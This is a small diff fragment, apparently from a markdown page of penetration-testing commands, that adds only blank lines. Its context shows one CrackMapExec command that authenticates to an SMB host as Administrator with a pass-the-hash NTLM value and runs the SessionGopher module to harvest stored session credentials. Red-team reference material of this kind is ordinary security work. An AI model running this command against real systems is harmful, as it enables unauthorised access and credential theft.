@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:25:48.419627+00:00'
 ```bash
 root@payload$ cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
 ```
+
+
